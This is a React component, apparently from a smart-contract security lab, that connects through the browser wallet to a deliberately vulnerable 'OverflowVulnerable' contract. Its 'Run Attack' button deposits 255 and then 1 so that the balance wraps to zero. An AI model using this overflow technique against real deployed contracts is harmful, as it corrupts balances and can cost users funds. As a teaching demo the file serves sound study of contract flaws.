import { useState } from "react";
import { ethers } from "ethers";
import overflowJson from "../abi/OverflowVulnerable.json";

const abi = overflowJson.abi;

// 🔥 PUT YOUR DEPLOYED ADDRESS HERE
const ADDRESS = "0x5FC8d32690cc91D4c39d9d3abcBD16989F875707";

function Overflow() {
  const [status, setStatus] = useState("");

  const runAttack = async () => {
    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();

      const contract = new ethers.Contract(ADDRESS, abi, signer);
      const before = await contract.balance();
      console.log("Before:", before.toString());

      await (await contract.deposit(255)).wait();
      await (await contract.deposit(1)).wait();

      const after = await contract.balance();
      console.log("After:", after.toString());

      if (after.toString() === "0") {
        setStatus("✅ Overflow SUCCESS 💀 balance reset to 0");
      } else {
        setStatus("❌ Overflow failed");
      }

    } catch (err) {
        console.error("FULL ERROR:", err);
        setStatus(err.message || "Error happened");
    }
  };

  return (
    <div>
      <h2>Overflow Attack</h2>
      <button onClick={runAttack}>Run Attack</button>
      <p>{status}</p>
    </div>
  );
}

export default Overflow;